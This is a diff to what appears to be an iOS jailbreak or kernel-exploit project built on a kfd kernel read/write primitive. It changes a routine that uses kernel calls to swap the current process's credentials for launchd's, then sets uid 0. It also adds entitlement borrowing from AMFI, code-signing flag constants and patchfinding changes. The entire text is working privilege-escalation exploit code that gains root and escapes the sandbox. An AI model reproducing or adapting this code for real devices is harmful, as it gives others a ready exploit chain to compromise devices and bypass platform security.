@@ -16,6 +16,7 @@
 #include <stdio.h>
 #include <UIKit/UIKit.h>
 #import "proc.h"
+#import "escalate.h"
 
 #define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
 #define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
@@ -389,13 +390,15 @@ int prepare_kcall(void) {
                 @"kcall_fake_vtable_allocations": @(_fake_vtable),
                 @"kcall_fake_client_allocations": @(_fake_client),
             };
-            
             BOOL success = [dictionary writeToFile:save_path atomically:YES];
             if (!success) { printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n"); return -1; }
            // sandbox(getpid(), sb);
             bool didweboxit = sandbox(getpid(), sb);
            // printf("Sandboxed? = %i\n", didweboxit);
             usleep(1000);
+            uint64_t procAmfipid = proc_of_pidAMFI(getpid());
+            borrow_entitlements(getpid(), 1);
+            
            // printf("Saved fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
            // init_kcall2(FINAL_KFD);
             //init_kcall2(FINAL_KFD);
@@ -428,28 +431,30 @@ int term_kcall(void) {
     _user_client = 0;
     return 0;
 }
+#define TF_PLATFORM (0x00000400)
+#define CS_PLATFORM_BINARY (0x04000000)
+#define CS_INSTALLER (0x00000008)
+#define CS_GET_TASK_ALLOW (0x00000004)
+#define CS_RESTRICT (0x00000800)
+#define CS_HARD (0x00000100)
+#define CS_KILL (0x00000200)
+#define CS_DEBUGGED                    0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
+#define CS_ENFORCEMENT     0x00001000  /* require enforcement */
+#define CS_REQUIRE_LV      0x00002000  /* require library validation */
 
 uint64_t gogroo(uint64_t proc_addr)
 {
     uint64_t self_ro = kread64(proc_addr + 0x20);
-   // util_printf("self_ro @ 0x%llx\n", self_ro);
     uint64_t old_OG_proc_ucred = kread64(self_ro + 0x20);
-   // util_printf("old_OG_proc_ucred @ 0x%llx\n", old_OG_proc_ucred);
-   // util_printf("test_uid = %d\n", getuid());
-
-    uint64_t kernproc = proc_of_pid(1);
-   // util_printf("kern proc @ %llx\n", kernproc);
+    uint64_t kernproc = proc_of_pid(0);
     uint64_t kern_ro = kread64(kernproc + 0x20);
-   // util_printf("kern_ro @ 0x%llx\n", kern_ro);
-    uint64_t kern_ucred = kread64(kern_ro + 0x20);
-   // util_printf("kern_ucred @ 0x%llx\n", kern_ucred);
-   // util_printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
-    // use proc_set_ucred to set kernel ucred.
-    kcallKRW(proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
-//    kcall2(proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
+    uint64_t LDproc = proc_of_pid(1);
+    uint64_t LDproc_ro = kread64(LDproc + 0x20);
+    uint64_t LDproc_ucred = kread64(LDproc_ro + 0x20);
+    kcallKRW(proc_set_ucred_func, proc_addr, LDproc_ucred, 0, 0, 0, 0, 0);
+    
     setuid(0);
     setuid(0);
-   // util_printf("getuid: %d\n", getuid());
     return old_OG_proc_ucred;
 }
 
@@ -458,8 +463,8 @@ void stage22(u64 kfd)
     struct kfd* kfd_struct = (struct kfd*)kfd;
     //util_printf("patchfinding!\n");
     init_kernel(kfd_struct);
- 
-    add_x0_x0_0x40_ret_func = getOffset(0);
+    
+    //add_x0_x0_0x40_ret_func = getOffset(0);
     if (add_x0_x0_0x40_ret_func == 0) {
     //    util_printf("[-] add_x0_x0_0x40_ret_func not in cache, patchfinding\n");
         add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct); //18446744005378351284
@@ -471,36 +476,19 @@ void stage22(u64 kfd)
     //util_printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
     //util_printf("slide @ 0x%llx", kfd_struct->info.kernel.kernel_slide);
 
-    proc_set_ucred_func = getOffset(1);
+    //proc_set_ucred_func = getOffset(1);
     if (proc_set_ucred_func == 0) {
      //   util_printf("[-] proc_set_ucred_func not in cache, patchfinding\n");
         
         proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);//18446744005408493912
-       // util_printf("proc_set_ucred_func @ 0x%llx", proc_set_ucred_func);
-       // util_printf("proc_set_ucred_func - slide @ 0x%llx", proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
-       // util_printf("proc_set_ucred_func + slide @ 0x%llx", proc_set_ucred_func | kfd_struct->info.kernel.kernel_slide);
-
         setOffset(1, proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
-      //  util_printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
-
     } else {
-       // util_printf("[+] proc_set_ucred_func in cache\n");
         proc_set_ucred_func += kfd_struct->info.kernel.kernel_slide;
     }
-
-    //util_printf("patchfinding complete!\n");
     pid_t pid = getpid();
-    //util_printf("pid = %d\n", pid);
     uint64_t proc_addr = proc_of_pid(getpid());//proc_of_pid2(kfd, getpid());
-    //util_printf("proc_addr @ 0x%llx\n", proc_addr);
-   // util_printf("init_kcall!\n");
     init_kcallKRW();
-    //init_kcall2(kfd);
-    //util_printf("getRoot!\n");
-    //getRoot(kfd, proc_addr);
     gogroo(proc_addr);///18446744017486185808
-    //groot_ogucredof_proc = getRoot(kfd, proc_addr);
-    //util_printf("proc_addr @ 0x%llx\n", proc_addr);
 
 }
 
